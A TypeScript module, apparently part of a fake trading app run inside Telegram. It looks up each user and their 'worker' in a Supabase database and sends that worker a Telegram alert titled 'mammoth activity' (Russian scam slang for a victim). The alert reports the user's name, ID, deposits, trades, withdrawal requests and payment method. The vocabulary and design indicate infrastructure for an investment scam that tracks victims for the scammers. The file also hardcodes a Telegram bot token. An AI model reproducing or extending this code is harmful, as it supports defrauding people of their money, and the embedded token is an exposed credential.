import { supabase } from '../supabaseClient';

// Конфигурация бота для уведомлений
const BOT_TOKEN = '7769124785:AAE46Zt6jh9IPVt4IB4u0j8kgEVg2NpSYa0';

/**
 * Отправляет уведомление рефереру (воркеру) о действии пользователя
 * @param actionName - название действия (например, "Пополнение", "Открытие сделки")
 * @param actionDetails - дополнительные детали действия
 */
export async function notifyReferrer(actionName: string, actionDetails?: {
    amount?: number;
    symbol?: string;
    currency?: string;
    method?: string;
}) {
    try {
        // 1. Получаем ID текущего пользователя из Telegram WebApp
        const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
        let userId = tgUser?.id;
        
        // Fallback: читаем tgid из URL
        if (!userId) {
            const urlParams = new URLSearchParams(window.location.search);
            const urlTgId = urlParams.get('tgid');
            if (urlTgId && !isNaN(Number(urlTgId))) {
                userId = Number(urlTgId);
            }
        }
        
        if (!userId) {
            console.log('Не удалось получить ID пользователя для уведомления');
            return false;
        }

        // 2. Получаем данные пользователя и его реферера из Supabase
        const { data: userData, error: userError } = await supabase
            .from('users')
            .select('user_id, username, full_name, referrer_id')
            .eq('user_id', userId)
            .single();

        if (userError || !userData) {
            console.log('Пользователь не найден в базе данных');
            return false;
        }

        // 3. Проверяем, есть ли реферер
        if (!userData.referrer_id) {
            console.log('У пользователя нет реферера');
            return false;
        }

        // 4. Получаем данные реферера (воркера)
        const { data: referrerData, error: referrerError } = await supabase
            .from('users')
            .select('user_id, username, full_name')
            .eq('user_id', userData.referrer_id)
            .single();

        if (referrerError || !referrerData) {
            console.log('Реферер не найден в базе данных');
            return false;
        }

        // 5. Формируем сообщение для воркера
        const userName = userData.full_name || 'Неизвестно';
        const userNickname = userData.username || 'Нет никнейма';
        
        let message = `🔔 <b>АКТИВНОСТЬ МАМОНТА</b>\n\n`;
        message += `👤 <b>Пользователь:</b> ${userName}\n`;
        message += `📱 <b>Никнейм:</b> ${userNickname}\n`;
        message += `🆔 <b>ID:</b> ${userData.user_id}\n\n`;
        message += `⚡️ <b>Действие:</b> ${actionName}\n`;

        // Добавляем детали действия если есть
        if (actionDetails) {
            if (actionDetails.amount) {
                message += `💰 <b>Сумма:</b> ${actionDetails.amount}`;
                if (actionDetails.currency) {
                    message += ` ${actionDetails.currency}`;
                }
                message += `\n`;
            }
            if (actionDetails.symbol) {
                message += `📊 <b>Актив:</b> ${actionDetails.symbol}\n`;
            }
            if (actionDetails.method) {
                message += `💳 <b>Метод:</b> ${actionDetails.method}\n`;
            }
        }

        message += `\n📅 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;

        // 6. Отправляем уведомление воркеру через Telegram Bot API
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: userData.referrer_id,
                text: message,
                parse_mode: 'HTML'
            })
        });

        if (response.ok) {
            console.log(`Уведомление отправлено воркеру ${userData.referrer_id}`);
            return true;
        } else {
            const errorData = await response.json();
            console.error('Ошибка отправки уведомления:', errorData);
            return false;
        }

    } catch (error) {
        console.error('Ошибка в notifyReferrer:', error);
        return false;
    }
}

/**
 * Быстрые функции для конкретных действий
 */
export const notifyDeposit = (amount: number, currency: string, method: string) => {
    return notifyReferrer('Пополнение счета', { amount, currency, method });
};

export const notifyTrade = (symbol: string, amount: number) => {
    return notifyReferrer('Открытие сделки', { symbol, amount });
};

export const notifyWithdraw = (amount: number) => {
    return notifyReferrer('Запрос на вывод', { amount, currency: 'USD' });
};

export const notifyRegistration = () => {
    return notifyReferrer('Регистрация в системе');
};